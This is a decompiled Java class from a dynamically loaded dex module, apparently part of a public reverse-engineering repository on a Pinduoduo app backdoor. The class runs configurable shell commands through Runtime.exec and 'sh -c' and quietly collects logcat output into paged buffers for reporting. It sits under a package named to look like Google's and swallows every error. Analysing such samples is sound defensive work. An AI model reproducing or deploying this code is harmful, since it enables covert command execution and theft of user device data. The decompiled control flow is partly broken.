package com.google.android.sd.biz_dynamic_dex.td.logcat.c.b;

import android.content.Context;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b;
import com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.a.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.a.b;
import com.google.android.sd.utils.IoUtils;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public final class a implements a.a {
  Context a;
  
  b b;
  
  StringBuilder c = new StringBuilder();
  
  int d = 0;
  
  int e = 0;
  
  boolean f = true;
  
  Process g;
  
  InputStreamReader h = null;
  
  BufferedReader i = null;
  
  private boolean j = false;
  
  private StringBuilder k = new StringBuilder();
  
  public a(Context paramContext, b paramb) {
    try {
      b.a("core_new_instance");
      this.a = paramContext;
      this.b = paramb;
      a a1 = b.a;
      if (a1 != null) {
        StringBuilder stringBuilder2 = a1.a;
        if (stringBuilder2 != null)
          this.k.append(stringBuilder2); 
        stringBuilder2 = a1.b;
        if (stringBuilder2 != null)
          this.c.append(stringBuilder2); 
        if (a1.d > 0)
          this.d = a1.d; 
        if (a1.c > 0)
          this.e = a1.c; 
        b.a = null;
        StringBuilder stringBuilder1 = new StringBuilder("core_append_pre_line_");
        stringBuilder1.append(this.d);
        stringBuilder1.append("_page_");
        stringBuilder1.append(this.e);
        b.a(stringBuilder1.toString());
      } 
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  private static boolean a(b paramb) {
    try {
      String str = paramb.g;
      if (TextUtils.isEmpty(str))
        return false; 
      Runtime.getRuntime().exec(str);
      return true;
    } catch (Exception exception) {
      return false;
    } 
  }
  
  private String e() {
    try {
      StringBuilder stringBuilder = this.k;
      if (stringBuilder != null)
        return stringBuilder.toString(); 
    } catch (Exception exception) {}
    return "";
  }
  
  public final void a() {
    try {
      b.a("core_do_start");
      if (this.j || this.c == null || this.k == null) {
        b.a("core_not_start_again");
        return;
      } 
      this.j = true;
      b.a("core_expand_cache_".concat(String.valueOf(a(this.b))));
      this.f = false;
      (new Thread(new Runnable(this) {
            public final void run() {
              try {
                a a1 = this.a;
                Context context = a1.a;
                b b = this.a.b;
                try {
                  long l1 = System.currentTimeMillis();
                  long l2 = b.c;
                  int i = b.d;
                  int j = b.e;
                  String str = b.f;
                  if (a1.e >= i) {
                    b.a("pre_is_already_full");
                    a1.a(false);
                    return;
                  } 
                  a1.g = Runtime.getRuntime().exec(new String[] { "sh", "-c", str });
                  a1.h = new InputStreamReader(a1.g.getInputStream());
                  a1.i = new BufferedReader(a1.h);
                  b.a("core_start_catch");
                  while (!a1.f) {
                    str = a1.i.readLine();
                    if (TextUtils.isEmpty(str)) {
                      com.google.android.sd.biz_dynamic_dex.base.a.c();
                      continue;
                    } 
                    StringBuilder stringBuilder1 = a1.c;
                    stringBuilder1.append("\n");
                    stringBuilder1.append(str);
                    "【append】".concat(String.valueOf(str));
                    com.google.android.sd.biz_dynamic_dex.base.a.c();
                    int k = ++a1.d;
                    if (k >= j) {
                      a1.c();
                      a1.d = 0;
                      a1.e++;
                      if (a1.e >= i) {
                        b.a("core_stop_logcat_for_max_page");
                        a.f(context, a1.b.a);
                        a.b(context, "3");
                        a1.f = true;
                        break;
                      } 
                    } 
                    if (System.currentTimeMillis() - l1 > l2 * 1000L) {
                      b.a("core_stop_logcat_for_max_time_loop");
                      a.b(context, "3");
                      a1.f = true;
                      a1.c();
                      break;
                    } 
                  } 
                  StringBuilder stringBuilder = new StringBuilder("core_stop_logcat_flag_");
                  stringBuilder.append(a1.f);
                  b.a(stringBuilder.toString());
                  a1.a(false);
                  return;
                } catch (Exception exception) {
                  b.a("core_catch_logcat_error_".concat(String.valueOf(exception)));
                  a1.a(false);
                  return;
                } finally {}
                a1.a(false);
                throw context;
              } catch (Exception exception) {
                return;
              } 
            }
          })).start();
      a.a(this.a, this.b.c * 1000L, this);
      return;
    } catch (Exception exception) {
      b.a("core_do_start_error_".concat(String.valueOf(exception)));
      return;
    } 
  }
  
  public final void a(Context paramContext) {
    try {
      b.a("core_stop_logcat_for_max_time");
      this.f = true;
      c();
      a.f(paramContext, this.b.a);
      a(false);
      return;
    } catch (Exception exception) {
      b.a("core_on_proguard_error".concat(String.valueOf(exception)));
      return;
    } 
  }
  
  final void a(boolean paramBoolean) {
    Exception exception;
    /* monitor enter ThisExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a}} */
    try {
      b.a("core_do_finish_work_".concat(String.valueOf(paramBoolean)));
      if (!this.f) {
        b.a("core_stop_logcat");
        this.f = true;
      } 
      if (paramBoolean && this.k != null) {
        b.a("core_clear_result");
        this.k = null;
      } 
      if (this.c != null) {
        b.a("core_clear_temp");
        this.c = null;
      } 
      if (this.g != null) {
        b.a("core_destroy_process");
        this.g.destroy();
        this.g = null;
      } 
      InputStreamReader inputStreamReader = this.h;
      if (inputStreamReader != null) {
        IoUtils.closeQuietly(inputStreamReader);
        this.h = null;
      } 
      BufferedReader bufferedReader = this.i;
      if (bufferedReader != null) {
        IoUtils.closeQuietly(bufferedReader);
        this.i = null;
      } 
      this.e = 0;
      this.d = 0;
      a.a();
      b.a(this.a);
      /* monitor exit ThisExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a}} */
      return;
    } catch (Exception null) {
      b.a("core_do_finish_error_".concat(String.valueOf(exception)));
      /* monitor exit ThisExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a}} */
      return;
    } finally {}
    /* monitor exit ThisExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/td/logcat/c/b/a}} */
    throw exception;
  }
  
  public final String b() {
    try {
      b.a("core_do_report");
      if (!this.f) {
        b.a("core_stop_logcat_for_report");
        this.f = true;
      } 
      c();
      return e();
    } catch (Exception exception) {
      b.a("core_do_report_error_".concat(String.valueOf(exception)));
      return "";
    } 
  }
  
  final void c() {
    try {
      if (this.c != null && this.k != null) {
        b.a("core_append_data");
        this.k.append(this.c);
        this.c = new StringBuilder();
      } 
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public final void d() {
    try {
      b.a("core_do_stop");
      a(true);
      return;
    } catch (Exception exception) {
      b.a("core_do_stop_error_".concat(String.valueOf(exception)));
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\2aa151e2cfa04acb8fb96e523807ca6b-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\c\b\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */